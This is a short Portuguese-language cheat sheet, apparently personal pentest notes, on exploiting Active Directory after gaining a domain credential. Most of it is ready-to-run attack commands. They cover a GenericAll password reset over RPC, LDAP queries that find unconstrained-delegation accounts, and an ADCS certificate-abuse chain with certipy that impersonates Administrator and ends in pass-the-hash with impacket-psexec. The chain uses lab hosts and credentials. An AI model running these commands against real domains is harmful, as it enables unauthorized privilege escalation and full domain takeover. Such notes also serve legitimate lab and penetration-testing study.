Explorando Active Directory
========================

Depois de comprometer alguma credencial/máquina de domínio temos a oportunidade de algum tipo de exploração, sendo elas:

- [ ] [**Abuso de DACLs**](#abusando%20dacls)
- [ ] [**Unconstrained delegation**](#unconstrained%20delegation)
- [ ] [**ADCS**](#adcs)


## Abusando DACLs

Esse tipo de permissionamento pode ser encontrada com a ferramenta do [bloodhound que está documentada aqui.](../../Tools/Bloodhound.md) .

### GenericAll

Com o genericAll podemos alterar a senha do usuário sem sequer saber a senha anterior. Para isso podemos utilizar serviços diferentes. Temos como opção:

#### RPC

```
setuserinfo2 hacker 24 Password@1
```
ou
```
setuserinfo hacker 23 P@ssword!
```

#### SMB



## Unconstrained delegation

```
ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -D "thoffman@lab.ropnop.com" -W -b "dc=lab,dc=ropnop,dc=com" "(&(&(objectCategory=person)(objectClass=user)) userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

```
ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -D "thoffman@lab.ropnop.com" -W -b "dc=lab,dc=ropnop,dc=com" "(&(objectCategory=computer)(objectClass=computer) userAccountControl:1.2.840.113556.1.4.803:=524288))"
```


## ADCS


```
netexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M adcs
```
    
```
certipy find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -stdout -vulnerable
```
    
```
certipy req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn 'Administrator@sequel.htb'
```
    
```
certipy auth -pfx administrator.pfx
```
    
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee Administrator@sequel.htb
```
